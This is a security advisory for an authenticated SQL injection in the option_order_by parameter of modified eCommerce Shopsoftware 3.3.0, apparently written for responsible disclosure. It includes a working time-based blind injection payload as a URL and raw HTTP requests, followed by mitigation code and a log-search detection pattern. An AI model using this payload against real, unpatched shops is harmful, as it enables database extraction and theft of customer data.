# Security Advisory: SQL Injection in `option_order_by` (modified eCommerce Shopsoftware 3.3.0)

> **Identifier:** CVE pending assignment / Internal ID **MS-2026-02**
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** High
> **CVSS:** 6.5 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`
> **CWE:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
> **Status:** Unpatched

---

## 1. Executive Summary

A **SQL Injection (CWE-89)** vulnerability was identified in **modified eCommerce Shopsoftware**, version **3.3.0**, revision **16825**, in the `option_order_by` GET parameter of the administrative endpoint `admin/products_attributes.php`. The value is concatenated directly into the `ORDER BY` clause of an SQL query, without allowlist validation or parameterization. An authenticated administrator can inject arbitrary SQL expressions into the query. The flaw was dynamically confirmed in an authorized laboratory environment via a time-based blind payload using `SLEEP(5)`. No official fix is available.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | **3.3.0** rev. 16825 and likely all prior versions with the same module | None | Affected |
| Component: `admin/includes/modules/new_attributes_include.php` | 3.3.0 | None | Affected |

- **Repository / Ecosystem:** [https://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop)
- **Evaluated stack:** PHP 8.x + MySQL/MariaDB, Apache 2.4 (Debian/Kali), Chromium
- **Test Environment:** `http://127.0.0.1:8080` (authorized local instance)

### Unaffected Products

- No other versions or products were evaluated in this advisory.

---

## 3. Vulnerability Description

The `admin/products_attributes.php` endpoint includes the module `admin/includes/modules/new_attributes_include.php`. In this module, the `option_order_by` parameter is retrieved directly from `$_GET` and concatenated into the `ORDER BY` clause of an SQL query without any backend allowlist validation or parameterization.

Although the administrative interface presents predefined sorting options (`products_options_sortorder`, `products_options_id`, `products_options_name`), no server-side restriction enforces these values.

**Root cause — `admin/includes/modules/new_attributes_include.php`:**

```php
ORDER BY " . $option_order_by . ", products_options_id ASC
```

### Necessary Conditions

- **Authentication:** Admin panel session required
- **User interaction:** None
- **Attack vector:** Network (GET request)
- **Preconditions:** Valid administrative session with access to `admin/products_attributes.php`

---

## 4. Impact

An attacker with an administrative session can inject arbitrary SQL expressions into the `ORDER BY` clause. Depending on the database user's privileges and DBMS configuration, potential impacts include:

- **Confidentiality:** High — extraction of data stored in the database, enumeration of tables and schema structures, inference of data via blind SQL Injection techniques
- **Integrity:** High — potential data manipulation depending on the database user's privileges
- **Availability:** High — potential denial of service via resource-exhausting queries (e.g., `SLEEP`, heavy subqueries)

---

## 5. Classification

### CVSS

- **Score:** 6.5
- **Severity:** High
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network (N) |
| Attack Complexity (AC) | Low (L) |
| Privileges Required (PR) | High (H) |
| User Interaction (UI) | None (N) |
| Scope (S) | Unchanged (U) |
| Confidentiality (C) | High (H) |
| Integrity (I) | High (H) |
| Availability (A) | High (H) |

> **PR:H Justification:** exploitation requires a valid administrative session. The score reflects the realistic attacker profile given the need for high privileges, while still capturing the full impact on the database.

### CWE

- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

### CAPEC (optional)

- **CAPEC-7:** Blind SQL Injection

---

## 6. Exploitation Scenario

1. The attacker obtains a valid administrative session for the modified eCommerce panel.
2. The attacker crafts a GET request to `admin/products_attributes.php` with a malicious `option_order_by` value containing an SQL expression.
3. The application concatenates the value directly into the `ORDER BY` clause and executes the query.
4. The attacker uses a time-based blind technique (`IF(..., SLEEP(5), 0)`) to confirm injection and iteratively exfiltrate data from the database.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): admin/includes/modules/new_attributes_include.php
Parameter(s): option_order_by (GET)
Method: GET · Authentication: admin session required
Tested Version: 3.3.0 rev. 16825
```

### Example Request

```http
GET /admin/products_attributes.php?option_order_by=products_options_id%2CIF%28%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%20WHERE%20table_schema%3DDATABASE%28%29%20AND%20table_name%3D%27customers%27%29%3D1%2CSLEEP%285%29%2C0%29&current_product_id=1 HTTP/1.1
Host: 127.0.0.1:8080
Cookie: [admin session cookie redacted]
```

### Observed Response

```text
HTTP 200 OK with ~5 second delay when the `customers` table exists in the current database schema,
confirming time-based blind SQL Injection execution.
```

### Result

The payload was executed within the SQL query context. The condition `IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name='customers')=1, SLEEP(5), 0)` triggered a ~5-second response delay, confirming successful injection in the authorized laboratory at `http://127.0.0.1:8080`.

**Evidence:** Time-based delay observed in the authorized local instance.

---

## 8. Proof of Concept

This PoC is for use exclusively in authorized environments and is limited to demonstrating the injection behavior via time-based delay.

**URL completa de demonstração (laboratório autorizado):**

```text
http://127.0.0.1:8080/admin/products_attributes.php?option_order_by=products_options_id%2CIF%28%28SELECT%20COUNT%28%2A%29%20FROM%20information_schema.tables%20WHERE%20table_schema%3DDATABASE%28%29%20AND%20table_name%3D%27customers%27%29%3D1%2CSLEEP%285%29%2C0%29&current_product_id=1
```

**Parâmetros decodificados:**

```text
option_order_by=products_options_id,IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name='customers')=1,SLEEP(5),0)
current_product_id=1
```

**Request equivalente:**

```http
GET /admin/products_attributes.php?option_order_by=products_options_id%2CIF%28%28SELECT+COUNT%28%2A%29+FROM+information_schema.tables+WHERE+table_schema%3DDATABASE%28%29+AND+table_name%3D%27customers%27%29%3D1%2CSLEEP%285%29%2C0%29&current_product_id=1 HTTP/1.1
Host: 127.0.0.1:8080
Cookie: [sessão administrativa do laboratório]
```

**Comportamento observado:** o payload é executado no contexto da query SQL com uma condição baseada na existência da tabela `customers` no banco de dados atual. Quando a condição é satisfeita, o MariaDB executa `SLEEP(5)`, confirmando injeção de expressões SQL arbitrárias no parâmetro `option_order_by`.

### Expected Result

```text
HTTP 200 OK com tempo de resposta ≥ 5 segundos quando a tabela `customers` existe,
confirmando a injeção de expressões SQL arbitrárias na cláusula ORDER BY.
```

### PoC Limitations

- Does not cause service disruption beyond the intentional query delay.
- Does not modify or remove any data.
- Does not create persistence or backdoors.
- Does not contain real credentials.
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Set up an authorized instance of **modified eCommerce Shopsoftware 3.3.0** at `http://127.0.0.1:8080`.
2. Authenticate to the administrative panel (`/admin/`).
3. Send the GET request described in section 8 to `admin/products_attributes.php`.
4. Observe the response time — a delay of ~5 seconds confirms execution of the injected SQL.
5. Compare with normal response time when using a valid allowlisted value such as `products_options_sortorder`.

---

## 10. Mitigation

Until an official fix is available:

- Implement a server-side allowlist for the `option_order_by` parameter, rejecting any value not in the predefined set:

```php
$allowed_order_by = [
    'products_options_sortorder',
    'products_options_id',
    'products_options_name'
];
$option_order_by = $_GET['option_order_by'] ?? 'products_options_sortorder';
if (!in_array($option_order_by, $allowed_order_by, true)) {
    $option_order_by = 'products_options_sortorder';
}
```

- Never concatenate user-controlled input directly into SQL clauses (`ORDER BY`, `GROUP BY`, column or table names).
- Apply WAF/reverse proxy rules to detect and block SQL injection patterns in GET parameters.
- Restrict access to the administrative panel via network ACL, VPN, or IP allowlist.
- Review other endpoints where identifiers or SQL fragments may be concatenated into queries.

> Mitigations reduce risk but may not completely eliminate the vulnerability.

---

## 11. Fix

**No official fix available as of the date of this advisory (product unpatched).**

Recommended actions once a fix is available:

1. Update to the patched version or later.
2. Restart affected services, if necessary.
3. Invalidate old sessions and credentials.
4. Review logs before and after the update.
5. Confirm the vulnerable behavior can no longer be reproduced.

### Recommended Change to Vendor

```php
// admin/includes/modules/new_attributes_include.php
$allowed_order_by = [
    'products_options_sortorder',
    'products_options_id',
    'products_options_name'
];
$option_order_by = $_GET['option_order_by'] ?? 'products_options_sortorder';
if (!in_array($option_order_by, $allowed_order_by, true)) {
    $option_order_by = 'products_options_sortorder';
}
// Use $option_order_by in the ORDER BY clause (safe, allowlist-validated value)
```

- Review all other GET/POST parameters used in SQL clause construction (column identifiers, sort directions, table fragments) for the same pattern.

---

## 12. Detection and Indicators

Possible exploitation indicators:

- Requests to `admin/products_attributes.php` with `option_order_by` values containing SQL keywords (`SELECT`, `SLEEP`, `IF`, `UNION`, `FROM`, `information_schema`) in access logs.

### Example Log Search

```text
grep -Ei "(SLEEP|SELECT|UNION|information_schema|IF\()" access.log | grep "products_attributes.php"
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Vulnerability identified (static analysis of `new_attributes_include.php`) in version 3.3.0 rev. 16825 |
| 16/11/2026 | Dynamically confirmed via time-based blind payload in authorized laboratory (`http://127.0.0.1:8080`) |
| 16/11/2026 | Disclosure package prepared (this advisory) |
| (pending) | Vendor notified |
| (pending) | CVE requested or reserved |
| (pending) | Fix made available |
| (pending) | Advisory published |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified eCommerce Shopsoftware Team (`modified-shop`)
- **Channel used:** Private GitHub Security Advisory (`modified-shop/modified-shop`) / official forum (`modified-shop.org`)
- **Date of first notification:** (pending)
- **Response status:** Awaiting notification/response
- **Vendor position:** N/A at this time

---

## 15. Credits

- **Researcher:** vinniboy021 (@vinniboy021)
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com / https://github.com/vinniboy021

---

## 16. References

- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
- [CVSS calculator: https://www.first.org/cvss/calculator/3.1](https://www.first.org/cvss/calculator/3.1)
- [https://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop)
- [https://www.modified-shop.org](https://www.modified-shop.org/)

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication — SQL Injection in `option_order_by` (version 3.3.0 rev. 16825) |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

The information was obtained in an authorized environment and disclosed responsibly. The author does not encourage unauthorized access, service disruption, privacy violations, or any illegal activity. Use of this information is the reader's responsibility.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021/agent-cve-hunter
